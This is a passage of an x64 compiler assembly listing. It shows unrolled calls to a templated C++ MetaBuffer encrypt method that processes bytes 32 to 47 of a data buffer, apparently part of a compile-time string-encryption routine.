  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
